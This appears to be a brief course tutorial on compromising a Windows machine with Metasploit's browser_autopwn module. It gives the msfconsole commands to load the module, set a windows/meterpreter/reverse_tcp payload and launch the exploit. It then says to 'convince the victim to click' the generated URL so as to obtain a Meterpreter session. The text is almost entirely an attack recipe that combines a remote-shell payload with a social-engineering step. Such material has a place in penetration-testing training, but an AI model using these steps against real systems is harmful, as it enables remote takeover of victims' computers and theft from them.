We will use **Metasploit**

````
service postgresql start

msfconsole
````

- We will search **browser autopwn**, which is an auxiliary module provided by Metasploit that allows you to attack a victim machine simply when they access a webpage
````
search autopwn

use auxiliary/server/browser_autopwn
````

- Now set up the payload
````
set payload windows/meterpreter/reverse_tcp

set SRVHOST eth0 #localhost

exploit
````

Now, it's time to convince the victim to click on the URL generated:
Using URL: http://192.168.58.128:8080/pluralsight

- Now we have a full Meterpreter
